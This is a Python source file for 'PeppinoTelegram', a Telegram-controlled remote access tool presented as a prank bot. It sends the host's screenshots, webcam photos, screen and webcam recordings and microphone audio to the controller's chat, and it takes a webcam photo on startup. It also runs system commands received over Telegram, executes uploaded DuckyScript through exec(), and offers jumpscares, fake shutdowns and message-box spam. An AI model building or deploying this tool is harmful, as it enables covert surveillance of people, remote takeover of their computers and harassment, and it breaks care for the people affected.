#TELEGRAM
import requests
from telepot import Bot, glance
from telepot.loop import MessageLoop
from telepot.exception import TelegramError
from telepot.namedtuple import InlineKeyboardButton, InlineKeyboardMarkup

#IMAGES
import numpy as np
from PIL import Image
from io import BytesIO
from cv2 import (VideoWriter, VideoCapture, imwrite, imshow, imread, resize, waitKey,
                 setWindowProperty, WND_PROP_TOPMOST, cvtColor, COLOR_BGR2RGB, VideoWriter_fourcc,
                 destroyAllWindows, WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN, namedWindow, Mat, 
                 CAP_PROP_FRAME_WIDTH, CAP_PROP_FRAME_HEIGHT)

#AUDIO/VIDEO
from moviepy.editor import AudioFileClip, VideoFileClip

#AUDIO
import soundfile as sf
import sounddevice as sd
try:
    from winsound import PlaySound, SND_FILENAME
except ImportError:
    PlaySound = lambda *args:args
    SND_FILENAME = None

#MISC
import json
import ctypes
import traceback
import pyautogui as pg
import subprocess as sp
from random import choice
from loguru import logger
from re import findall, M
from time import time, sleep
from threading import Thread
from datetime import datetime
from typing import Any, Callable
from keyboard import press, release
from os.path import join, abspath, isdir
from webbrowser import open as browseropen
from platform import system as platform_system
from os import system, remove, getenv, getcwd, listdir, name 

logging = False
iswindows = name == "nt"
islinux = not iswindows
cwd_folder = getcwd()
vfx = abspath(join(cwd_folder, "vfx"))
sfx = abspath(join(cwd_folder, "sfx"))
HOME_PATH = getenv("USERPROFILE") if iswindows else getenv("HOME")
if not logging:
    logger.remove()
logger.info(f"{iswindows=} {islinux=} {HOME_PATH=} {cwd_folder=}")

DUCKYHELP = """DELAY [time] – Adds a delay in milliseconds (e.g., DELAY 1000 waits 1 second).
REM [comment] – Adds a comment (e.g., REM This is a comment).
STRING [text] – Types a string of characters (e.g., STRING Hello World).
ENTER – Presses the Enter key.
SPACE – Presses the Spacebar.
TAB – Presses the Tab key.
ESC – Presses the Escape key.
CTRL – Presses the Control key.
SHIFT – Presses the Shift key.
ALT – Presses the Alt key.
GUI – Presses the Windows key (or the "Command" key on macOS).
WINDOWS – Same as GUI.
APP – Presses the "Application" key (context menu key).
DOWNARROW, UPARROW, LEFTARROW, RIGHTARROW – Presses arrow keys.
CAPSLOCK – Toggles Caps Lock.
NUMLOCK – Toggles Num Lock.
DELETE – Presses the Delete key.
HOME – Presses the Home key.
END – Presses the End key.
PAGEUP – Presses Page Up.
PAGEDOWN – Presses Page Down."""

HELP = """id - Get Owner Chat ID.  
pss - Play "psst" sound.  
bsend - Send custom text.  
altf4 - Simulate Alt + F4.  
breath - Play breathing sound.  
selphie - Take a webcam selfie.  
shutdown - Shut down the PC.  
duckyhelp - Show Duckyscript tutorial.  
jumpscare - Show random jumpscare.  
screenshot - Capture screen.  
fullclip - Record screen + webcam.  
plankton - Plankton.
gabinetti - Gabinetti nella villa.
webcamclip - Record webcam.  
screenclip - Record screen.  
messagebox - Show a custom message box.  
messagespam - Spam message boxes.  
fakeshutdown - Fake system shutdown.  
execute - Run system command.  
microphone - Record mic audio.  
browser - Open URL in browser.
quickmenu - Opens a quick menu.

*sending a photo* - Displays the photo on the screen as a pop-up.
*sending an audio/voice* - Will play the audio/voice in the background.
*sending a file that ends with '.dd' - will execute it as duckyscript. (send /duckyhelp to get commands)

You can run multiple commands at the same time by sending them in the same message but separated by a comma.
For example this command: "/fullclip 10; /jumpscare" will start the recording, waits 5 seconds, then sends a
jumpscare while recording screen and webcam"""


def now() -> str:
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

#AUDIO CONVERSION
def wav_to_ogg(filename: str, rmold: bool=False) -> str:
    data, samplerate = sf.read(filename)
    new_filepath = filename.replace(".wav", ".ogg")
    sf.write(new_filepath, data, samplerate, format="OGG", subtype="OPUS")
    if rmold:
        remove(filename)
    return new_filepath

def ogg_to_wav(filename: str, rmold: bool=False) -> str:
    data, sr = sf.read(filename) 
    new_filepath = filename.replace(".ogg", ".wav")
    sf.write(new_filepath, data, sr)
    if rmold:
        remove(filename)
    return new_filepath

#GETTING TOKEN AND CHAT_ID
def getCred(filename: str="creds.json") -> tuple[str,int]:
    with open(filename, "r") as fi:
        var = json.load(fi)
    token = var["token"]
    chat_id = var["chat_id"]
    return token,chat_id
        
#Resizing assets so they all take the same time to load when doing jumpscares
def compress_and_resize_image(image_array, target_size=(1920, 1080), quality=30) -> np.array:
    img = Image.fromarray(image_array)
    img_resized = img.resize(target_size, Image.Resampling.LANCZOS)
    buffer = BytesIO()
    img_resized.save(buffer, 'JPEG', quality=quality)
    buffer.seek(0)
    compressed_image = np.array(Image.open(buffer))
    return compressed_image

def show_image_fullscreen(image) -> None:
    namedWindow("FullScreenImage", WND_PROP_FULLSCREEN)
    setWindowProperty("FullScreenImage", WND_PROP_TOPMOST, 1)
    setWindowProperty("FullScreenImage", WND_PROP_FULLSCREEN, WINDOW_FULLSCREEN)
    imshow("FullScreenImage", image) 
    waitKey(1250)
    destroyAllWindows()

def set_volume(volume_percent: int):
    volume_percent = max(0, min(100, volume_percent))
    system = platform_system()

    if system == "Windows":
        volume = int((volume_percent / 100) * 0xFFFF)
        ctypes.windll.winmm.waveOutSetVolume(0, volume | (volume << 16))
    elif system == "Linux":
        sp.run(["amixer", "-D", "pulse", "sset", "Master", f"{volume_percent}%"], check=False)
    elif system == "Darwin":  # macOS
        sp.run(["osascript", "-e", f"set volume output volume {volume_percent}"], check=False)
    else:
        print("Unsupported OS")

def load_images(vfx_folder: str=vfx) -> dict[str:Mat]:
    return { x[:-4]:compress_and_resize_image(imread(join(vfx_folder,x))) for x in listdir(vfx_folder) }

def load_audios(sfx_folder: str=sfx) -> list[str]:
    return { x[:-4]:abspath(join(sfx_folder,x)) for x in listdir(sfx_folder) }

def randomname(lenght: int=10) -> str:
    return "".join([ choice("qwertyuiopasdfghjklzxcvbnm") for _ in range(lenght)])

def randompngname(lenght: int=10) -> str:
    return randomname(lenght)+".png"

"""
oooooooooo.    .oooooo..o   .oooooo.   ooooooooo.   ooooo ooooooooo.   ooooooooooooo 
`888'   `Y8b  d8P'    `Y8  d8P'  `Y8b  `888   `Y88. `888' `888   `Y88. 8'   888   `8 
 888      888 Y88bo.      888           888   .d88'  888   888   .d88'      888      
 888      888  `"Y8888o.  888           888ooo88P'   888   888ooo88P'       888      
 888      888      `"Y88b 888           888`88b.     888   888              888      
 888     d88' oo     .d8P `88b    ooo   888  `88b.   888   888              888      
o888bood8P'   8""88888P'   `Y8bood8P'  o888o  o888o o888o o888o            o888o     

"""
def toducky(payload):
    duckyScript = [x.strip() for x in payload.split("\n")]
    final = ""
    defaultDelay = 0
    if duckyScript[0][:7] == "DEFAULT":
        defaultDelay = int(duckyScript[0][:13]) / 1000
    previousStatement = ""
    duckyCommands = ["WINDOWS", "GUI", "APP", "MENU", "SHIFT", "ALT", "CONTROL", "CTRL", "DOWNARROW", "DOWN",
                     "LEFTARROW", "LEFT", "RIGHTARROW", "RIGHT", "UPARROW", "UP", "BREAK", "PAUSE", "CAPSLOCK", "DELETE", "END",
                     "ESC", "ESCAPE", "HOME", "INSERT", "NUMLOCK", "PAGEUP", "PAGEDOWN", "PRINTSCREEN", "SCROLLLOCK", "SPACE", 
                     "TAB", "ENTER", " a", " b", " c", " d", " e", " f", " g", " h", " i", " j", " k", " l", " m", " n", " o", " p", " q", " r", " s", " t",
                     " u", " v", " w", " x", " y", " z", " A", " B", " C", " D", " E", " F", " G", " H", " I", " J", " K", " L", " M", " N", " O", " P",
                     " Q", " R", " S", " T", " U", " V", " W", " X", " Y", " Z"]
    pyautoguiCommands = ["win", "win", "optionleft", "optionleft", "shift", "alt", "ctrl", "ctrl", "down", "down",
                         "left", "left", "right", "right", "up", "up", "pause", "pause", "capslock", "delete", "end",
                         "esc", "escape", "home", "insert", "numlock", "pageup", "pagedown", "printscreen", "scrolllock", "space",
                         "tab", "enter", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t",
                         "u", "v", "w", "x", "y", "z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p",
                         "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"]
    for line in duckyScript:
        if line[0:3] == "REM":
            previousStatement = line.replace("REM", "#")
        elif line[0:5] == "DELAY":
            previousStatement = "sleep(" + str(float(line[6:]) / 1000) + ")"
        elif line[0:6] == "STRING":
            previousStatement = "pg.typewrite(\"" + line[7:] + "\", interval=0.02)"
        elif line[0:6] == "REPEAT":
            for i in range(int(line[7:]) - 1):
                final += previousStatement
                final += "\n"
        else:
            previousStatement = "pg.hotkey("
            for j in range(len(pyautoguiCommands)):
                if line.find(duckyCommands[j]) != -1:
                    previousStatement = previousStatement + "\'" + pyautoguiCommands[j] + "\',"
            previousStatement = previousStatement[:-1] + ")"
        if defaultDelay != 0:
            previousStatement = "sleep(" + str(defaultDelay) + ")"
        final += previousStatement
        final += "\n"

    return(final.replace("pg.hotkey)\n", ""))


class ButtonsMenu:
    def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0) -> None:
        self.bot = bot
        self.label = label
        self.chat_id = chat_id
        self.buttons = buttons
        self.page_limit = page_limit
        self.page = page 
        self.next_btn = next_btn
        self.keyboard = self.create_keyboard()
        self.sent = False
        if autosend:
            self.send_keyboard()

    def create_keyboard(self) -> Any:
        start_index = self.page * self.page_limit
        button_list = [InlineKeyboardButton(text=k, callback_data=self.buttons[k]) for k in list(self.buttons.keys())[start_index:start_index + self.page_limit]]

        if self.next_btn:
            if self.page > 0:
                button_list.append(InlineKeyboardButton(text="⬅️ Previous", callback_data="previous_page"))
            if (self.page + 1) * self.page_limit < len(self.buttons):
                button_list.append(InlineKeyboardButton(text="Next ➡️", callback_data="next_page"))
        
        keyboard_rows = [button_list[i:i+2] for i in range(0, len(button_list), 2)]
        return InlineKeyboardMarkup(inline_keyboard=keyboard_rows)

    def send_keyboard(self) -> int:
        self.sent = True
        self.message_id = self.bot.sendMessage(self.chat_id, self.label, reply_markup=self.keyboard)["message_id"]
        return self.message_id
    
    def edit_keyboard(self, buttons: dict) -> int:
        self.buttons = buttons
        self.keyboard = self.create_keyboard()
        self.message_id = self.bot.editMessageReplyMarkup((self.chat_id, self.message_id), reply_markup=self.keyboard)["message_id"]
        return self.message_id

    def delete(self):
        if self.sent:
            self.bot.deleteMessage((self.chat_id, self.message_id))


class EditableMessage:
    def __init__(self, bot: Bot, chat_id, content: str, autosend: bool=True, bold: bool=False) -> None:
        self.bot = bot
        self.bold = bold
        self.chat_id = chat_id
        self.content = content
        self.sent = False
        if autosend:
            self.send()
    
    def send(self) -> int|None:
        if self.bold:
            self.content = f"<b>{self.content}</b>"
        try:
            self.message_id = self.bot.sendMessage(self.chat_id, self.content, parse_mode="HTML" if self.bold else None)["message_id"]
            self.sent = True
            return self.message_id
        except Exception as e:
            logger.info(e)
            #idk
    
    def edit(self, new_content: str) -> bool:
        if self.bold:
            new_content = f"<b>{new_content}</b>"
        try:
            self.bot.editMessageText((self.chat_id, self.message_id), new_content, parse_mode="HTML" if self.bold else None)
            return True
        except TelegramError as e:
            return False
    
    def delete(self) -> None:
        if self.sent:
            self.bot.deleteMessage((self.chat_id, self.message_id))
    
    def delete_and_send(self, message: str) -> None:
        self.delete()
        self.bot.sendMessage(self.chat_id, message)

class AsciiAnimation(EditableMessage):
    def __init__(self, bot, chat_id, frames, autosend=True, bold=False):
        super().__init__(bot, chat_id, content=frames[0], autosend=autosend, bold=bold)
        self.frames = frames
    
    def play(self, repeat: int):
        for i in range(repeat):
            for frame in self.frames:
                self.edit(frame)
                sleep(0.5)

class LoadingBar:
    def __init__(self, total: int, chat_id: int, bot: Bot, autosend: bool=True, autodelete: bool=True, showperc: bool=True):
        self.bot = bot
        self.tot = total
        self.chat_id = chat_id
        self.showperc = showperc
        self.autodelete = autodelete

        self.full_char = "🔲"
        self.empty_char = "🔶"
        self.progress = 0
        self.done = False
        self.bar_lenght = 10

        self.bar = self.get_bar()

        if autosend:
            self.setup()

    def get_bar(self):
        self.perc_progress = round((self.progress / self.tot) * 100, 1)
        self.int_perc_progress = int(self.perc_progress)
        bar = "🔲" * (self.int_perc_progress//self.bar_lenght) + ("🔶" * ((self.bar_lenght - (self.int_perc_progress//self.bar_lenght))))
        bar = f"{bar}" + (f"{self.perc_progress}%" if self.showperc else "")
        return bar

    def prep_animation(self, repeat: int = 2, progress: int = 25) -> None:
        for i in range(repeat):
            for i in range(0, 101, progress):
                self.set_progress(i)
                self.update()
                sleep(0.05)
            for i in range(100, 0, -progress):
                self.set_progress(i)
                self.update()
                sleep(0.05)

            for i in range(0, 101, progress):
                self.set_progress(i)
                self.update()
            sleep(0.05)
        self.set100()
        self.delete()

    def setup(self):
        bar = self.get_bar()
        self.ETDMessage = EditableMessage(self.bot, self.chat_id, bar)

    def set_progress(self, progress: int) -> None:
        self.progress = progress

    def update(self):
        if self.done:
            return
        previous_bar = self.bar
        bar = self.get_bar()
        if bar!=previous_bar:
            self.ETDMessage.edit(bar)
            return
        if self.int_perc_progress >= 100 and self.autodelete:
            self.ETDMessage.delete()
            self.done = True
    
    def delete(self):
        self.ETDMessage.delete()
    
    def set100(self):
        if self.done:
            return
        self.progress = self.tot
        self.update()

class PeppinoTelegram:
    def __init__(self, token: str, owner_id: int) -> None:
        self.token = token
        self.help = HELP
        self.owner_name = ""
        self.bot = Bot(token) 
        self.owner_id = owner_id
        self.duckyhelp = DUCKYHELP
        self.explorer_path = getcwd()
        self.page = 0
        self.explorer_message = None
        #converts text to functions
        self.function_table: dict[str:Callable] = {
            "pss":self.pss,
            "psst":self.pss,
            "bsend":self.bsend,
            "altf4":self.altf4,
            "breath":self.breath,
            "browser":browseropen,
            "execute":self.execute,
            "selphie":self.selphie,
            "plankton":self.plankton,
            "shutdown":self.shutdown,
            "quickmenu":self.quickmenu,
            "gabinetti":self.gabinetti,
            "jumpscare":self.jumpscare,
            "screenshot":self.screenshot,
            "messagebox":self.message_box,
            "webcamclip":self.record_webcam,
            "screenclip":self.record_screen,
            "messagespam":self.spam_windows,
            "fakeshutdown":self.fake_shutdown,
            "microphone":self.send_record_audio,
            "help":lambda: self.bsend(self.help),
            "fullclip":self.record_webcam_and_screen,
            "duckyhelp":lambda: self.bsend(self.duckyhelp),
            "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
        }
    
    def __send_image(self, image_name: str) -> bool:
        try:
            with open(image_name, "rb") as image:
                msg = self.bot.sendPhoto(self.owner_id, image)["message_id"]
            return msg
        except Exception as e:
            return self.bsend(f"Error while sending an image\n{e}")
    
    def __playsound(self, audio: str) -> None:
        logger.info(f"Playing {audio}")
        PlaySound(audio, SND_FILENAME)
    
    def __play_loaded_sound(self, audio: str) -> None:
        self.__playsound(self.audios[audio])
    
    def new_editable_message(self, content: str, autosend: bool=True) -> EditableMessage:
        return EditableMessage(self.bot, self.owner_id, content, autosend)
    
    def new_loading_bar(self, total: int, autodelete: bool=False, showperc:bool=True) -> LoadingBar:
        return LoadingBar(total, self.owner_id, self.bot, autodelete=autodelete, showperc=showperc)
    
    def new_menu(self, menu: dict[str:Any], autosend: bool=True, label="Choose an option: ", page=0, next_btn: bool=False) -> ButtonsMenu:
        return ButtonsMenu(self.owner_id, self.bot, menu, label, autosend, page=page, next_btn=next_btn)
    
    def bsend(self, text: str) -> int|None:
        try:
            return self.bot.sendMessage(self.owner_id, text)["message_id"]
        except Exception as e:
            logger.info(f"Error while sending message(?)\n{e}")
            ...#idk

    """
  .oooooo.      ooo        ooooo oooooooooooo ooooo      ooo ooooo     ooo
 d8P'  `Y8b     `88.       .888' `888'     `8 `888b.     `8' `888'     `8'
888      888     888b     d'888   888          8 `88b.    8   888       8
888      888     8 Y88. .P  888   888oooo8     8   `88b.  8   888       8
888      888     8  `888'   888   888    "     8     `88b.8   888       8
`88b    d88b     8    Y     888   888       o  8       `888   `88.    .8'
 `Y8bood8P'Ybd' o8o        o888o o888ooooood8 o8o        `8     `YbodP'
    """
    def quickmenu(self):
        buttons = {
            "Screenshot":"screenshot",
            "Jumpscare":"jumpscare",
            "Plankton":"plankton",
            "ALT F4":"altf4",
            "Psst..":"pss",
            "Webcam Clip (5s)":"webcamclip",
            "Screen Clip (5s)":"screenclip",
            "Full Clip (5s)":"fullclip",
            "Microphone Clip (5s)":"microphone",
        }
        menu = self.new_menu(buttons, autosend=False)
        return menu.send_keyboard()
    
    def on_callback_query(self, msg):
        query_id, from_id, data = glance(msg, flavor="callback_query")
        self.parse_command(data) 
        self.bot.answerCallbackQuery(query_id)
        
    def screenshot(self) -> int:
        try:
            filename = join(HOME_PATH,randompngname())
            screenshot = pg.screenshot()
            screenshot.save(filename)
            message_id = self.__send_image(filename)
            remove(filename)
            return message_id
        except Exception as e:
            return self.bsend(f"Error while getting screenshot\n{e}")

    def message_box(self, title: str, text: str, style=0x1000) -> None:
        return ctypes.windll.user32.MessageBoxW(0, text, title, style)

    def spam_windows(self, n: int, text: str) -> None:
        for i in range(n):
            sp_win = Thread(target=self.message_box, args=["Warning", text,])
            sp_win.start()

    def show_image(self, image_path: int) -> None:
        try:
            imshow("Warning", resize(imread(image_path), (400, 400)))
            setWindowProperty("Warning", WND_PROP_TOPMOST, 1)
            waitKey(0)
            remove(image_path)
        except Exception as e:
            print(e)
        

    """
ooooooooo.   oooooooooooo   .oooooo.     .oooooo.   ooooooooo.   oooooooooo.   
`888   `Y88. `888'     `8  d8P'  `Y8b   d8P'  `Y8b  `888   `Y88. `888'   `Y8b  
 888   .d88'  888         888          888      888  888   .d88'  888      888 
 888ooo88P'   888oooo8    888          888      888  888ooo88P'   888      888 
 888`88b.     888    "    888          888      888  888`88b.     888      888 
 888  `88b.   888       o `88b    ooo  `88b    d88'  888  `88b.   888     d88' 
o888o  o888o o888ooooood8  `Y8bood8P'   `Y8bood8P'  o888o  o888o o888bood8P'   
    """
    
    def record_screen(self, duration: int=5, caption: str|None=None) -> None:
        duration = int(duration)
        bar = self.new_loading_bar(duration)
        try:
            filename = f"{HOME_PATH}/{randomname()}.mp4"
            audio_filename = f"{HOME_PATH}/{randomname()}.wav"
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0
            while int(time_elapsed) < duration:
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                out.write(img)
            bar.set100()

            sd.wait()
            out.release()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                self.bot.sendVideo(self.owner_id, video, caption=caption)
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording screen: {e}")

    def record_webcam(self, duration: int=5, caption: str|None=None) -> None:
        duration = int(duration)
        bar = self.new_loading_bar(duration)
        try:
            filename = f"{HOME_PATH}/{randomname()}.mp4"
            audio_filename = f"{HOME_PATH}/{randomname()}.wav"
            fourcc = VideoWriter_fourcc(*'XVID')
            webcam = VideoCapture(0)
            width = int(webcam.get(CAP_PROP_FRAME_WIDTH))
            height = int(webcam.get(CAP_PROP_FRAME_HEIGHT))
            out = VideoWriter(filename, fourcc, 20.0, (width, height))
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')
            time_elapsed = 0
            while int(time_elapsed) < duration:
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                ret, frame = webcam.read()
                if not ret:
                    break
                out.write(frame)
            bar.set100()
            sd.wait()
            out.release()
            webcam.release()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                self.bot.sendVideo(self.owner_id, video, caption=caption)
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            self.bsend(f"Error while recording webcam {e}")

    def record_webcam_and_screen(self, capture_duration: int=5, caption: str|None=None) -> None:
        capture_duration = int(capture_duration)
        bar = self.new_loading_bar(capture_duration)
        try:
            filename = join(HOME_PATH, randomname() + ".mp4")
            audio_filename = join(HOME_PATH, randomname() + ".wav")
            SCREEN_SIZE = tuple(pg.size())
            fourcc = VideoWriter_fourcc(*'XVID')
            out = VideoWriter(filename, fourcc, 20.0, SCREEN_SIZE)
            webcam = VideoCapture(0)
            start_time = time()
            samplerate = 44100
            channels = 1
            frames = int(capture_duration * samplerate)
            audio_data = sd.rec(frames, samplerate=samplerate, channels=channels, dtype='int16')

            time_elapsed = 0 
            while int(time_elapsed) < capture_duration:
                time_elapsed = time() - start_time
                bar.progress = time_elapsed
                bar.update()
                img = pg.screenshot()
                img = np.array(img)
                img = cvtColor(img, COLOR_BGR2RGB)
                _, frame = webcam.read()
                fr_height, fr_width, _ = frame.shape
                frame = resize(frame, (fr_width//2, fr_height//2))
                fr_height, fr_width, _ = frame.shape
                img[0:fr_height, 0:fr_width, :] = frame[0:fr_height, 0:fr_width, :]
                out.write(img)
            bar.set100()
            sd.wait()
            out.release()
            webcam.release()
            sf.write(audio_filename, audio_data, samplerate)
            video_clip = VideoFileClip(filename)
            audio_clip = AudioFileClip(audio_filename)
            video_with_audio = video_clip.set_audio(audio_clip)
            final_filename = filename.replace(".mp4", "_final.mp4")
            video_with_audio.write_videofile(final_filename, logger=None)#someone must pay for this
            tmploadingmessage = self.new_editable_message("Sending recording...", True)
            with open(final_filename, "rb") as video:
                self.bot.sendVideo(self.owner_id, video, caption=caption)
            tmploadingmessage.delete()
            remove(filename)
            remove(audio_filename)
            remove(final_filename)
        except Exception as e:
            e = traceback.format_exc()
            self.bsend(f"Error while sending video clip\n{e}")

    def record_audio(self, filename, seconds, samplerate=48000) -> bool|Exception:
        try:
            seconds = float(seconds)
            frames = int(seconds * samplerate)
            data = sd.rec(frames, samplerate=samplerate, channels=1, dtype='int16')
            sd.wait()
            sf.write(filename, data, samplerate)
            return True
        except Exception as e:
            return e 
        
    def send_record_audio(self, seconds: int=5, caption: str|None=None) -> None:
        message = self.new_editable_message(f"Recording audio of {seconds} seconds.")
        filename = randomname()+".wav"
        filepath = join(HOME_PATH, filename)
        logger.info("Recording audio...")
        res = self.record_audio(filepath, seconds)
        if isinstance(res, Exception):
            err = f"Error while recording audio: {res}"
            self.bsend(err)
            logger.info(err)
        else:
            logger.info("Done recording audio...")
            message.edit("Done recording, sending...")
            filepath = wav_to_ogg(filepath, rmold=True)
            with open(filepath, "rb") as fi:
                self.bot.sendVoice(self.owner_id, fi, caption=caption)
            remove(filepath)
            message.delete()
            
    def execute(self, command) -> None:
        s = sp.run(command.split, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
        if s.returncode:
            output = s.stderr
        else:
            output = s.stdout

        self.bsend(output)
        
    def selphie(self, caption: str|None=None) -> None:
        try:
            filename = join(HOME_PATH,randompngname())
            camera = VideoCapture(0)
            return_value, image = camera.read()
            if not return_value:
                raise Exception("Could not find camera")
            imwrite(filename, image)
            del(camera)
            self.bot.sendPhoto(self.owner_id, open(filename, "rb"), caption=caption)
            remove(filename)
        except Exception as e:
            self.bsend(f"Something has happened while getting webcam\n {e}")

    def altf4(self) -> None:
        press('alt')
        press('f4')
        release('f4')
        release('alt')
    
    def shutdown(self, seconds=0) -> None:
        system(f"shutdown -s -t {seconds}")

    def fake_shutdown(self) -> None:
        system('shutdown /s /t 34 /c "Windows Error 104e240-69, notify the administrator"')
        system("shutdown -a")
        
    def pss(self) -> None:
        self.__play_loaded_sound("pss")
    
    def breath(self) -> None:
        self.__play_loaded_sound("breath")
    
    def jumpscare(self, image=None, audio=None, playaudio=True, showimage=True) -> None:
        set_volume(100)
        if image is None:
            image = self.images[choice(list(self.images.keys()))]
        else:
            image = self.images[image]
        if audio is None:
            audio = self.audios["ghost-roar"]
        else:
            audio = self.audios[audio]
        imageThread = Thread(target=show_image_fullscreen ,args=(image,))
        audioThread = Thread(target=PlaySound, args=(audio,SND_FILENAME))
        if playaudio:
            audioThread.start()
        if showimage:
            imageThread.start()
        if playaudio:
            audioThread.join()
        if showimage:
            imageThread.join()
    
    def plankton(self) -> None:
        self.jumpscare("plankton", "plankton")
    
    def gabinetti(self) -> None:
        self.jumpscare("plankton", "gabinetti")

    """
ooooooooo.         .o.       ooooooooo.    .oooooo..o ooooo ooooo      ooo   .oooooo.    
`888   `Y88.      .888.      `888   `Y88. d8P'    `Y8 `888' `888b.     `8'  d8P'  `Y8b   
 888   .d88'     .8"888.      888   .d88' Y88bo.       888   8 `88b.    8  888
 888ooo88P'     .8' `888.     888ooo88P'   `"Y8888o.   888   8   `88b.  8  888
 888           .88ooo8888.    888`88b.         `"Y88b  888   8     `88b.8  888     ooooo 
 888          .8'     `888.   888  `88b.  oo     .d8P  888   8       `888  `88.    .88'  
o888o        o88o     o8888o o888o  o888o 8""88888P'  o888o o8o        `8   `Y8bood8P'   

    """

    def parse_audio(self, msg):
        if 'voice' in msg:
            file_id = msg['voice']['file_id']
        elif 'audio' in msg:
            file_id = msg['audio']['file_id']
        file_info = self.bot.getFile(file_id)
        file_url = f"https://api.telegram.org/file/bot{self.token}/{file_info['file_path']}"
        filename = randomname()+".ogg"
        filepath = join(HOME_PATH, filename)
        response = requests.get(file_url)
        with open(filepath, "wb") as f:
            f.write(response.content) 
        filepath = ogg_to_wav(filepath, rmold=True)
        self.__playsound(filepath)
        remove(filepath)

    def parse_photo(self, msg) -> None:
        filename = randompngname()
        filepath = join(HOME_PATH, filename)
        self.bot.download_file(msg['photo'][-1]['file_id'], filepath)
        logger.info("Image downloaded")
        Thread(target=self.show_image, args=[filepath,]).start()
        sleep(0.5)
        remove(filepath)
    
    def parse_text(self, msg) -> None:
        text = msg["text"]
        if text == "/start":
            return None
        elif ";" in text:
            commands = text.split(";")
            for command in commands:
                self.parse_command(command) 
        else:
            self.parse_command(text)
    
    def parse_command(self, text: str) -> None:
        args = text.split()
        command = args[0]

        if command.startswith("/"):
            command = args[0][1:]
        function_args = args[1:]

        func = self.function_table.get(command)
        if func:
            try:
                if function_args:
                    thread_args = (function_args,)
                    new_thread = Thread(target=func, args=thread_args)
                else:
                    new_thread = Thread(target=func)
                new_thread.start()
            except TypeError as e:
                self.bsend(f"Invalid args for function {command}\n{e}")
        else:
            self.bsend(f"Invalid command {command}")
    
    def parse_document(self, msg: str) -> None:
        document = msg["document"]
        filename = document["file_name"]
        file_id = document["file_id"]
        saved_filename = randomname()
        saved_filepath = join(HOME_PATH, saved_filename)
        self.bot.download_file(file_id, saved_filepath)
        self.bsend(f"{filename} saved as {saved_filepath}")
        if filename.endswith(".dd"):
            with open(saved_filepath, "r") as fi:
                content = fi.read()
            payload_python = toducky(content)
            self.bsend(f"Executing duckyscript {filename}({saved_filename})")
            exec(payload_python)
            remove(saved_filepath)
        
    def handle(self, msg: str) -> None:
        content_type, chat_type, chat_id = glance(msg)
        sender_name = msg["from"]["first_name"] 
        if chat_id == self.owner_id:
            logger.info(f"{content_type=} {chat_type=}")
            self.owner_name = sender_name
            if content_type == "text":
               self.parse_text(msg) 
            elif content_type == "photo":
                self.parse_photo(msg)
            elif content_type == "document":
                self.parse_document(msg)
            elif content_type in ("voice", "audio"):
                self.parse_audio(msg)
        else:
            self.bsend(f"What do you want {sender_name}, I don't work for you.")
    
    def extract_commands(self) -> list[dict]:
        commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
        return [{'command': cmd, 'description': desc} for cmd, desc in commands]

    def update_commands(self) -> bool:
        commands = self.extract_commands()
        url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
        payload = {'commands': commands}
        response = requests.post(url, json=payload)
        return response.status_code == 200

    def start(self) -> None:
        self.bot.deleteWebhook()
        self.update_commands()
        self.images = load_images()
        self.audios = load_audios()
        self.selphie(f"Bot started: "+now())
        loop = MessageLoop(self.bot, {"chat":self.handle, "callback_query":self.on_callback_query})
        loop.run_as_thread()
        while 1:
            try:
                sleep(0.01)
            except KeyboardInterrupt:
                self.bsend("Interrupted by host, bye bye")
                break

if __name__ == "__main__":
    token, chat_id = getCred() 
    pep2 = PeppinoTelegram(token,chat_id)
    pep2.start()
